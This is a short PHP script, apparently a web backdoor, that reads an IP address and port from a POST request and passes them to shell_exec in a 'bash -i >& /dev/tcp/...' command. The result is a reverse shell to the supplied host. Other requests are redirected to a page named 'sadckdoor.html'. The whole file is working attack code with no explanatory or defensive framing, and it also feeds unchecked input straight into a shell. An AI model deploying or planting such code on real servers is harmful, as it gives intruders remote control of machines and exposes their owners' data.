<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_POST['ip'];
    $port = $_POST['port'];

  
    if (!empty($ip) && !empty($port)) {
       
        $comandoBash = "bash -i >& /dev/tcp/$ip/$port 0>&1";

       
        $output = shell_exec($comandoBash);

        header('Content-Type: application/json');
        echo json_encode(['output' => $output]);
    } else {
        echo "Error: An empty field!.";
    }
} else {

    header('Location: sadckdoor.html');
    exit();
}
?>
